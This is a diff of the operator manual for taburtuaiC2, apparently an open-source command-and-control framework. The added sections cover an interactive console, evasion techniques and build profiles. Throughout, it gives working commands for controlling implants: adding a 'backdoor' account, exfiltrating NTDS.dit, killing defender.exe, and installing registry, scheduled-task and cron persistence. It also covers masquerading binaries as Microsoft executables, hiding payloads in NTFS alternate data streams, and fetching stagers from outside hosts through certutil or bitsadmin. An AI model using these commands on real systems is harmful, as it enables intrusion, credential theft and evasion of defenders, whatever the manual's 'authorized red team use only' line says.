@@ -1,6 +1,6 @@
 # taburtuaiC2 · Operator CLI
 
-**Version** 2.0.0 &nbsp;·&nbsp; **Author** mjopsec &nbsp;·&nbsp; **License** MIT
+**Version** 2.1.0 &nbsp;·&nbsp; **Author** mjopsec &nbsp;·&nbsp; **License** MIT
 
 > Authorized red team use only. All activity is logged server-side.
 
@@ -12,64 +12,66 @@
 |---|---------|
 | 1 | [Getting Started](#1-getting-started) |
 | 2 | [Global Flags](#2-global-flags) |
-| 3 | [Agent Management](#3-agent-management) |
-| 4 | [Interactive Shell](#4-interactive-shell) |
-| 5 | [Command Execution](#5-command-execution) |
-| 6 | [File Operations](#6-file-operations) |
-| 7 | [Process Management](#7-process-management) |
-| 8 | [Persistence](#8-persistence) |
-| 9 | [Queue Management](#9-queue-management) |
-| 10 | [Server & Logs](#10-server--logs) |
-| 11 | [Quick Reference](#11-quick-reference) |
+| 3 | [Interactive Console](#3-interactive-console) |
+| 4 | [Agent Management](#4-agent-management) |
+| 5 | [Interactive Shell](#5-interactive-shell) |
+| 6 | [Command Execution](#6-command-execution) |
+| 7 | [File Operations](#7-file-operations) |
+| 8 | [Process Management](#8-process-management) |
+| 9 | [Persistence](#9-persistence) |
+| 10 | [Queue Management](#10-queue-management) |
+| 11 | [Server & Logs](#11-server--logs) |
+| 12 | [Level 1 Evasion](#12-level-1-evasion) |
+| 13 | [Build Profiles](#13-build-profiles) |
+| 14 | [Quick Reference](#14-quick-reference) |
 
 ---
 
 ## 1. Getting Started
 
-### Installation
+### Build
 
 ```bash
-# Build binary (recommended)
+# Build operator CLI
 go build -o bin/operator ./cmd/operator
 
-# Or run directly without building
-go run ./cmd/operator <command>
+# Build agent (default profile)
+go build -o bin/agent.exe ./agent
+
+# Build agent with an OPSEC profile
+# See Section 13 — Build Profiles
 ```
 
-### Connecting to a Server
+### Connect
 
 ```bash
-# Via flag (one-time)
+# Via flag
 ./bin/operator --server http://172.23.0.118:9000 agents list
 
-# Via environment variable (persistent in session)
+# Via environment variable (persists for the session)
 export TABURTUAI_SERVER=http://172.23.0.118:9000
-./bin/operator agents list
-
-# With API key authentication (if server has --auth enabled)
 export TABURTUAI_API_KEY=your_secret_token
 ./bin/operator agents list
+
+# Interactive console (recommended)
+./bin/operator --server http://172.23.0.118:9000 console
 ```
 
 ### Agent ID Shorthand
 
-All commands accept either a full UUID or a unique prefix. The CLI resolves the prefix automatically.
+All commands accept a full UUID or a unique prefix (6–8 chars minimum).
 
 ```bash
 # Full UUID
 ./bin/operator shell 7d019eb7-3489-45f6-a2ab-c48d28d8e86c
 
-# Short prefix (minimum 6–8 chars recommended)
+# Short prefix — CLI resolves it automatically
 ./bin/operator shell 7d019eb7
 ```
-
-If the prefix matches multiple agents, the CLI returns an error and asks for a more specific prefix.
 
 ---
 
 ## 2. Global Flags
-
-These flags apply to every command.
 
 | Flag | Short | Env Variable | Default | Description |
 |------|-------|-------------|---------|-------------|
@@ -80,41 +82,66 @@ These flags apply to every command.
 
 ---
 
-## 3. Agent Management
+## 3. Interactive Console
+
+Launch a Metasploit-style REPL. The server is set once at startup — type commands without repeating `--server`.
+
+```bash
+./bin/operator --server http://172.23.0.118:9000 console
+
+# With API key
+./bin/operator --server http://172.23.0.118:9000 --api-key secret console
+```
+
+```
+taburtuai(172.23.0.118:9000) › agents list
+taburtuai(172.23.0.118:9000) › shell 7d019eb7
+taburtuai(172.23.0.118:9000) › fetch 7d019eb7 http://10.0.0.1/payload.exe "C:\Temp\svc.exe" --method certutil
+```
+
+**Features**
+- Arrow-key history navigation (↑/↓)
+- History saved to `/tmp/.taburtuai_history`
+- Quoted string support: `cmd execute 7d019eb7 "net user /add backdoor P@ss123"`
+- `help` or `?` — grouped command reference
+- `exit` / `quit` / Ctrl+D — end session
+- Contextual error messages with usage hints
+
+---
+
+## 4. Agent Management
 
 ### `agents list`
-
-List all registered agents with status and last-seen time.
 
 ```bash
 operator agents list
 ```
 
-**Agent Status**
+**Status values**
 
 | Status | Condition | Commands |
 |--------|-----------|----------|
-| `online` | Beaconed within last 10 min | Accepted |
+| `online` | Beaconed within last 10 min | Accepted immediately |
 | `dormant` | No beacon for 10–30 min | Accepted — delivered on next beacon |
 | `offline` | No beacon for > 30 min | Rejected |
 
-> Thresholds are configurable on the server via `AGENT_DORMANT_SEC` and `AGENT_OFFLINE_SEC`.
+> Thresholds configurable via `AGENT_DORMANT_SEC` / `AGENT_OFFLINE_SEC` on the server.
 
 ---
 
 ### `agents info <agent-id>`
 
-Show full details for a single agent: OS, architecture, privileges, working directory, and beacon statistics.
-
 ```bash
 operator agents info 7d019eb7
 ```
+
+Shows OS, architecture, privileges, working directory, and beacon statistics.
 
 ---
 
 ### `agents delete <agent-id>`
 
-Remove an agent record from the server database. Does not terminate the running implant.
+Remove an agent record from the server database. Does not kill the running implant.
 
 ```bash
 operator agents delete 7d019eb7
@@ -122,18 +149,26 @@ operator agents delete 7d019eb7
 
 ---
 
-## 4. Interactive Shell
+## 5. Interactive Shell
 
 Start a persistent interactive shell session with an agent.
 
 ```bash
-operator shell <agent-id>
+operator shell <agent-id> [--timeout <seconds>]
 ```
 
-**Behavior**
-- Each command is queued on the server and picked up by the agent on its next beacon
-- Response latency equals the beacon interval (default: 10 s ± 20% jitter)
-- Session persists until you type `exit`, `quit`, or press `Ctrl+D`
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--timeout` | `600` | Seconds to wait per command (must exceed max beacon interval + jitter) |
+
+**Beacon interval vs timeout**
+
+| Profile | Max beacon wait | Recommended `--timeout` |
+|---------|----------------|------------------------|
+| `default` | ~12s | 60 |
+| `opsec` | ~78s | 180 |
+| `stealth` | ~450s | 600 |
+| `paranoid` | ~900s | 900 |
 
 **Example**
 
@@ -150,38 +185,25 @@ Windows IP Configuration
 [7d019eb7] › exit
 ```
 
-> For time-sensitive operations, build the agent with a shorter `--interval` (e.g. `--interval 2`).
+> For stealth agents with 300s+ beacons, always set `--timeout` higher than the max beacon interval. Stealth default: `shell 7d019eb7 --timeout 600`
 
 ---
 
-## 5. Command Execution
+## 6. Command Execution
 
 ### `cmd execute <agent-id> "<command>" [flags]`
 
-Queue a single shell command on an agent and (optionally) wait for the result.
-
-```bash
-operator cmd execute <agent-id> "<command>" [flags]
-```
-
-**Flags**
+Queue a single shell command and optionally wait for the result.
 
 | Flag | Default | Description |
 |------|---------|-------------|
-| `--timeout` | `60` | Seconds to wait for the result |
+| `--timeout` | `300` | Seconds to wait for the result |
 | `--workdir` | — | Working directory on the agent |
-| `--background` | `false` | Queue and return immediately without waiting |
-
-**Examples**
+| `--background` | `false` | Queue and return immediately |
 
 ```bash
-# Basic execution
 operator cmd execute 7d019eb7 "whoami"
-
-# With working directory
 operator cmd execute 7d019eb7 "dir" --workdir "C:\Users\nurkh\Desktop"
-
-# Background (fire and forget)
 operator cmd execute 7d019eb7 "net user backdoor P@ss123 /add" --background
 ```
 
@@ -189,97 +211,73 @@ operator cmd execute 7d019eb7 "net user backdoor P@ss123 /add" --background
 
 ### `status <command-id>`
 
-Check the result of any previously queued command by its ID.
-
 ```bash
 operator status 5ba1dcad-5705-42bd-becd-3a749884216f
 ```
 
-**Status Values**
-
-| Value | Meaning |
-|-------|---------|
-| `pending` | Waiting for agent to pick up |
-| `in_progress` | Agent is executing |
+| Status | Meaning |
+|--------|---------|
+| `pending` | Waiting for agent beacon |
+| `in_progress` | Agent executing |
 | `completed` | Finished successfully |
-| `failed` | Executed but returned non-zero exit or error |
-| `timeout` | Exceeded the command timeout |
+| `failed` | Non-zero exit or error |
+| `timeout` | Exceeded command timeout |
 
 ---
 
 ### `history <agent-id> [flags]`
 
-View command execution history for an agent.
-
 ```bash
-operator history <agent-id> [--limit N] [--status STATUS]
+operator history 7d019eb7 [--limit N] [--status STATUS]
 ```
 
 | Flag | Default | Description |
 |------|---------|-------------|
-| `--limit` | `20` | Number of records to return (max 1000) |
+| `--limit` | `20` | Records to return (max 1000) |
 | `--status` | — | Filter: `pending` · `completed` · `failed` |
-
-```bash
-operator history 7d019eb7 --limit 50
-operator history 7d019eb7 --status failed
-```
 
 ---
 
-## 6. File Operations
-
-All file transfers route through the C2 server. The server queues the operation and the agent executes it on the next beacon.
+## 7. File Operations
 
 ### `files upload <agent-id> <local-path> <remote-path>`
 
-Upload a local file to the agent.
+Upload a file from the operator machine to the agent.
 
 ```bash
-operator files upload 7d019eb7 /tmp/mimikatz.exe "C:\Windows\Temp\svc.exe"
+operator files upload 7d019eb7 /tmp/payload.exe "C:\Windows\Temp\svc.exe"
 ```
 
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--wait` | `false` | Wait for agent to confirm write |
+> **ADS upload**: Use an ADS path as `<remote-path>` to write directly into a stream.
+> ```bash
+> operator files upload 7d019eb7 script.js "C:\Users\Public\readme.txt:update.js"
+> ```
 
 ---
 
 ### `files download <agent-id> <remote-path> <local-path>`
 
-Download a file from the agent to the C2 server.
+Download a file from the agent. The file is saved on the C2 server.
 
 ```bash
 operator files download 7d019eb7 "C:\Users\nurkh\NTDS.dit" /tmp/NTDS.dit
 ```
 
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--wait` | `false` | Wait for agent to complete exfiltration |
-
-> **Note**: The downloaded file is saved on the **C2 server**, not the operator machine. If running the CLI remotely, retrieve the file from the server separately.
+> If running the CLI remotely, retrieve the file from the C2 server separately after download.
 
 ---
 
-## 7. Process Management
+## 8. Process Management
 
 ### `process list <agent-id>`
 
-Retrieve a list of all running processes on the agent.
-
 ```bash
-operator process list 7d019eb7 --wait
+operator process list 7d019eb7
 ```
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--wait` | `true` | Wait for the process list to be returned |
 
 ---
 
 ### `process kill <agent-id> [flags]`
-
-Terminate a process by PID or by name. One of `--pid` or `--name` is required.
 
 ```bash
 operator process kill 7d019eb7 --pid 4821
@@ -289,90 +287,60 @@ operator process kill 7d019eb7 --name defender.exe
 | Flag | Short | Description |
 |------|-------|-------------|
 | `--pid` | `-p` | Process ID to terminate |
-| `--name` | `-n` | Process name to terminate (kills all matching) |
-| `--wait` | — | Wait for confirmation |
+| `--name` | `-n` | Process name (kills all matching) |
 
 ---
 
 ### `process start <agent-id> <executable> [flags]`
 
-Launch a new process on the agent. The executable path is a positional argument.
-
 ```bash
 operator process start 7d019eb7 "C:\Windows\System32\cmd.exe"
-operator process start 7d019eb7 "powershell.exe" --args "-NoProfile -ExecutionPolicy Bypass -File C:\tmp\run.ps1"
-operator process start 7d019eb7 "notepad.exe" --wait
+operator process start 7d019eb7 "powershell.exe" --args "-NoProfile -File C:\tmp\run.ps1"
 ```
 
 | Flag | Short | Description |
 |------|-------|-------------|
 | `--args` | `-a` | Arguments passed to the executable |
-| `--wait` | — | Wait for process output |
 
 ---
 
-## 8. Persistence
-
-Install or remove persistence mechanisms to maintain access across reboots.
+## 9. Persistence
 
 ### `persistence setup <agent-id> [flags]`
 
 ```bash
-operator persistence setup <agent-id> --method <method> --path <executable> [flags]
+operator persistence setup <agent-id> --method <method> --path <exe> [flags]
 ```
 
-**Flags**
+| Flag | Required | Description |
+|------|----------|-------------|
+| `--method` | Yes | Persistence method (see table) |
+| `--path` | Yes | Full path to executable on the target |
+| `--name` | No | Entry name (auto-generated if omitted) |
+| `--args` | No | Arguments passed at launch |
+| `--wait` | No | Wait for agent confirmation |
 
-| Flag | Required | Default | Description |
-|------|----------|---------|-------------|
-| `--method` | Yes | — | Persistence method (see table below) |
-| `--path` | Yes | — | Full path to executable on the target |
-| `--name` | No | auto-generated | Entry name (registry key / task / service name) |
-| `--args` | No | — | Arguments passed to the executable at launch |
-| `--wait` | No | `false` | Wait for agent to confirm |
-
-**Persistence Methods**
+**Methods**
 
 | Platform | Method | Trigger | Privilege |
 |----------|--------|---------|-----------|
 | Windows | `registry_run` | User logon | User |
 | Windows | `schtasks_onlogon` | User logon | User |
-| Windows | `schtasks_daily` | Daily schedule | User |
+| Windows | `schtasks_daily` | Daily | User |
 | Windows | `startup_folder` | User logon | User |
-| Linux | `cron_reboot` | System reboot | User |
+| Linux | `cron_reboot` | Reboot | User |
 | Linux | `systemd_user` | User session | User |
-| Linux | `bashrc` | Interactive shell | User |
+| Linux | `bashrc` | Shell open | User |
 | macOS | `launchagent` | User logon | User |
 
-**Method Aliases**
-
-| Alias | Resolves To |
-|-------|-------------|
-| `registry`, `reg` | `registry_run` |
-| `task`, `schtask`, `scheduled` | `schtasks_onlogon` |
-| `startup`, `folder` | `startup_folder` |
-| `cron` | `cron_reboot` |
-| `systemd`, `service` | `systemd_user` |
-| `bash` | `bashrc` |
-| `launch`, `plist` | `launchagent` |
-
-**Examples**
+**Aliases**: `reg` → `registry_run` · `task` → `schtasks_onlogon` · `cron` → `cron_reboot` · `bash` → `bashrc`
 
 ```bash
-# Windows — registry key
 operator persistence setup 7d019eb7 \
   --method registry_run \
   --path "C:\Windows\Temp\agent.exe" \
   --name "WindowsUpdate"
 
-# Windows — scheduled task, wait for confirmation
-operator persistence setup 7d019eb7 \
-  --method schtasks_onlogon \
-  --path "C:\Windows\Temp\agent.exe" \
-  --name "SvcHostMonitor" \
-  --wait
-
-# Linux — cron on reboot
 operator persistence setup 7d019eb7 \
   --method cron_reboot \
   --path /tmp/.agent
@@ -382,25 +350,15 @@ operator persistence setup 7d019eb7 \
 
 ### `persistence remove <agent-id> [flags]`
 
-Remove a previously installed persistence entry. Both `--method` and `--name` are required.
-
-```bash
-operator persistence remove <agent-id> --method <method> --name <name>
-```
-
-| Flag | Required | Description |
-|------|----------|-------------|
-| `--method` | Yes | Same method used during setup |
-| `--name` | Yes | Same entry name used during setup |
-| `--wait` | No | Wait for agent to confirm removal |
-
 ```bash
 operator persistence remove 7d019eb7 --method registry_run --name "WindowsUpdate"
 ```
 
+Both `--method` and `--name` are required.
+
 ---
 
-## 9. Queue Management
+## 10. Queue Management
 
 ### `queue stats`
 
@@ -410,25 +368,19 @@ Show pending command counts across all agents.
 operator queue stats
 ```
 
----
-
 ### `queue clear <agent-id>`
 
-Flush all pending (not yet executed) commands for an agent.
+Flush all pending commands for an agent.
 
 ```bash
 operator queue clear 7d019eb7
 ```
 
-> Use this to cancel commands queued for an offline agent before reassigning.
-
 ---
 
-## 10. Server & Logs
+## 11. Server & Logs
 
 ### `logs [flags]`
-
-Fetch server-side event logs.
 
 ```bash
 operator logs [--limit N] [--level LEVEL]
@@ -436,45 +388,252 @@ operator logs [--limit N] [--level LEVEL]
 
 | Flag | Default | Description |
 |------|---------|-------------|
-| `--limit` | `50` | Number of log entries to return |
-| `--level` | — | Filter: `DEBUG` · `INFO` · `WARN` · `ERROR` |
-
-```bash
-operator logs --limit 200 --level WARN
-```
-
----
+| `--limit` | `50` | Log entries to return |
+| `--level` | — | `DEBUG` · `INFO` · `WARN` · `ERROR` |
 
 ### `stats`
 
-Show a server health snapshot: uptime, agent counts by status, queue depth, and command totals.
-
-```bash
-operator stats
-```
-
----
+Server health snapshot: uptime, agent counts, queue depth, command totals.
 
 ### `version`
 
-Print the CLI version string.
+Print CLI version string.
+
+---
+
+## 12. Level 1 Evasion
+
+Level 1 features bypass signature-based AV and basic behavioral detection. Enabled via **build profiles** (Section 13) or operator commands.
+
+---
+
+### 12.1 Execution Methods
+
+Controls how the agent spawns shell commands on the target. Set at build time via the profile's `exec_method` field.
+
+| Method | Binary used | Parent seen by EDR | Notes |
+|--------|------------|-------------------|-------|
+| `cmd` | `cmd.exe /C` | agent process | Default for `default` profile |
+| `powershell` | `powershell.exe -EncodedCommand` | agent process | Command string is base64-encoded |
+| `wmi` | `wmic.exe process call create` | **WMI host (svchost.exe)** | Breaks parent-child chain; deprecated Win11 |
+| `mshta` | `mshta.exe javascript:WScript.Shell.Run(...)` | **mshta.exe** | Output via temp file |
+
+The `opsec` profile uses `powershell`, `stealth` uses `wmi`, `paranoid` uses `mshta`.
+
+---
+
+### 12.2 PE Masquerading
+
+Embeds fake Windows PE metadata into the compiled binary. The binary appears as a legitimate Windows application in Explorer, Task Manager, and most AV scanners.
+
+Configured in the build profile:
+
+```yaml
+masquerade:
+  enabled: true
+  company: "Microsoft Corporation"
+  product: "Windows Update"
+  description: "Windows Update Assistant"
+  original_filename: "wuauclt.exe"
+  version: "10.0.19041.1866"
+```
+
+Build the agent as usual — metadata is baked in automatically.
+
+**Default masquerades per profile**
+
+| Profile | Masquerades as |
+|---------|---------------|
+| `opsec` | `SecurityHealthService.exe` |
+| `stealth` | `wuauclt.exe` (Windows Update) |
+| `paranoid` | `MicrosoftEdgeUpdate.exe` |
+
+---
+
+### 12.3 Symbol & String Obfuscation (garble)
+
+When `obfuscate: true` is set in the profile, the builder uses [`garble`](https://github.com/burrowers/garble) instead of `go build`. Garble:
+
+- Randomizes all function/type/variable names
+- Obfuscates string literals (C2 URL, keys, etc. are not visible in `strings` output)
+- Removes debug info (`-tiny` flag)
+- Produces a different binary hash on every build (`-seed=random`)
+
+**Install garble once:**
 
 ```bash
-operator version
+go install mvdan.cc/garble@latest
+```
+
+Profiles with `obfuscate: true`: `stealth`, `paranoid`
+
+---
+
+### 12.4 ADS (Alternate Data Streams)
+
+NTFS Alternate Data Streams hide data inside existing files. The host file appears normal — its size, hash, and visible content are unchanged.
+
+#### `ads write <agent-id> <local-file> <target:stream>`
+
+Write a local file into an ADS on the target.
+
+```bash
+# Write a JS payload into the readme.txt stream
+operator ads write 7d019eb7 payload.js "C:\Users\Public\readme.txt:update.js"
+
+# Write a PS1 script into a log file stream
+operator ads write 7d019eb7 runner.ps1 "C:\ProgramData\app.log:svc.ps1"
+```
+
+The host file (`readme.txt`) must already exist on the target. Create it first if needed:
+```bash
+operator cmd execute 7d019eb7 "echo. > C:\Users\Public\readme.txt"
+```
+
+#### `ads exec <agent-id> <path:stream.ext>`
+
+Execute a script stored in an ADS via the appropriate LOLBin.
+
+| Extension | LOLBin used |
+|-----------|------------|
+| `.js` | `wscript.exe //E:jscript` |
+| `.vbs` | `wscript.exe` |
+| `.ps1` | `powershell.exe -EncodedCommand` |
+
+```bash
+operator ads exec 7d019eb7 "C:\Users\Public\readme.txt:update.js"
+operator ads exec 7d019eb7 "C:\ProgramData\app.log:svc.ps1" --wait --timeout 30
+```
+
+#### `ads read <agent-id> <source:stream> <local-file>`
+
+Read ADS contents back to the operator.
+
+```bash
+operator ads read 7d019eb7 "C:\Users\Public\readme.txt:update.js" /tmp/recovered.js
+```
+
+**Full ADS workflow example**
+
+```bash
+# 1. Create a host file on the target
+operator cmd execute 7d019eb7 "type nul > C:\Users\Public\notes.txt"
+
+# 2. Write JS payload into its stream
+operator ads write 7d019eb7 stager.js "C:\Users\Public\notes.txt:svc.js"
+
+# 3. Execute it via wscript
+operator ads exec 7d019eb7 "C:\Users\Public\notes.txt:svc.js" --wait
 ```
 
 ---
 
-## 11. Quick Reference
+### 12.5 LOLBin File Fetch
+
+Tell the agent to download a file from any URL using a trusted Windows binary instead of making the network request from the agent process directly.
+
+```bash
+operator fetch <agent-id> <url> <remote-path> [--method METHOD] [--wait] [--timeout N]
+```
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--method` | `certutil` | LOLBin: `certutil` · `bitsadmin` · `curl` · `powershell` |
+| `--wait` | `false` | Wait for download to complete on the agent |
+| `--timeout` | `120` | Seconds to wait |
+
+**Methods**
+
+| Method | Binary | Behavior | Notes |
+|--------|--------|----------|-------|
+| `certutil` | `certutil.exe` | HTTP GET + disk write | Present on all Windows; may be flagged by EDR now |
+| `bitsadmin` | `bitsadmin.exe` | BITS transfer job | Traffic resembles Windows Update; cleans up job on completion |
+| `curl` | `curl.exe` | HTTP GET | Native on Win10 1803+; clean, low-profile |
+| `powershell` | `powershell.exe` | `WebClient.DownloadFile` | Works everywhere; PS is monitored by some EDR |
+
+```bash
+# Default certutil download
+operator fetch 7d019eb7 http://192.168.1.10/agent2.exe "C:\Windows\Temp\svc.exe"
+
+# BITS download (traffic looks like Windows Update)
+operator fetch 7d019eb7 http://192.168.1.10/stage2.exe "C:\Windows\Temp\svc.exe" \
+  --method bitsadmin --wait
+
+# PowerShell WebClient download
+operator fetch 7d019eb7 http://192.168.1.10/run.ps1 "C:\ProgramData\run.ps1" \
+  --method powershell --wait --timeout 60
+
+# Download to ADS (combine with ads exec)
+operator fetch 7d019eb7 http://192.168.1.10/stager.js "C:\Users\Public\notes.txt:update.js" \
+  --method curl --wait
+operator ads exec 7d019eb7 "C:\Users\Public\notes.txt:update.js"
+```
+
+---
+
+## 13. Build Profiles
+
+Profiles are YAML files in `builder/profiles/`. Pass `--profile <name>` to the build script or generator to bake the settings in at compile time.
+
+### Available Profiles
+
+| Profile | Beacon | Exec Method | Masquerade | Garble | Use Case |
+|---------|--------|-------------|-----------|--------|----------|
+| `default` | 10s | `cmd` | off | off | Lab / VM testing |
+| `aggressive` | 5s | `cmd` | off | off | CTF / fast iteration |
+| `opsec` | 60s | `powershell` | SecurityHealthService | off | Real engagement, AV present |
+| `stealth` | 300s ±50% | `wmi` | wuauclt.exe | ✓ | Long-haul persistence, EDR present |
+| `paranoid` | 600s ±50% | `mshta` | MicrosoftEdgeUpdate | ✓ | High-value, SOC-monitored targets |
+
+### Shell Timeout per Profile
+
+Always set `--timeout` on the `shell` command to at least the profile's max beacon interval:
+
+```bash
+# default / aggressive
+operator shell 7d019eb7
+
+# opsec  (60s × 1.3 jitter ≈ 78s max)
+operator shell 7d019eb7 --timeout 180
+
+# stealth  (300s × 1.5 jitter = 450s max)
+operator shell 7d019eb7 --timeout 600
+
+# paranoid  (600s × 1.5 jitter = 900s max; also working-hours only)
+operator shell 7d019eb7 --timeout 900
+```
+
+### Working Hours (paranoid profile)
+
+The `paranoid` profile has `working_hours_only: true` with a 09:00–17:00 window. The agent **does not beacon outside those hours**. Commands queued after 17:00 execute on the next morning's first beacon.
+
+If you need 24/7 access, set `working_hours_only: false` in the profile before building.
+
+### Garble Setup
+
+Required for `stealth` and `paranoid` profiles:
+
+```bash
+go install mvdan.cc/garble@latest
+```
+
+Verify installation:
+```bash
+garble version
+```
+
+---
+
+## 14. Quick Reference
 
 ```
 AGENTS
-  agents list                                    list all agents + status
+  agents list                                    list agents + status
   agents info <id>                               detailed agent info
   agents delete <id>                             remove agent record
 
 EXECUTION
-  shell <id>                                     interactive shell session
+  shell <id> [--timeout N]                       interactive shell (set timeout > max beacon)
   cmd execute <id> "<cmd>" [--workdir] [--bg]    single command
   status <cmd-id>                                check command result
   history <id> [--limit] [--status]              execution history
@@ -485,12 +644,23 @@ FILES
 
 PROCESS
   process list  <id>                             list running processes
-  process kill  <id> --pid <n> | --name <name>   terminate process
+  process kill  <id> --pid <n> | --name <x>      terminate process
   process start <id> <exe> [--args "..."]        launch process
 
 PERSISTENCE
   persistence setup  <id> --method <m> --path <exe> [--name] [--args]
   persistence remove <id> --method <m> --name <n>
+
+ADS (Windows NTFS — Level 1 Evasion)
+  ads write <id> <local>       "<target:stream>"  write file into ADS
+  ads read  <id> "<src:stream>" <local>           read ADS to local
+  ads exec  <id> "<path:stream.js>"               execute script from ADS
+
+LOLBIN FETCH (Level 1 Evasion)
+  fetch <id> <url> <remote-path>                 download via certutil (default)
+  fetch <id> <url> <remote-path> --method bitsadmin   via BITS (WU-like traffic)
+  fetch <id> <url> <remote-path> --method curl        via curl.exe
+  fetch <id> <url> <remote-path> --method powershell  via WebClient
 
 QUEUE
   queue stats                                    pending command overview
@@ -500,4 +670,5 @@ SERVER
   logs   [--limit] [--level]                     server event logs
   stats                                          server health snapshot
   version                                        CLI version
+  console                                        interactive REPL
 ```
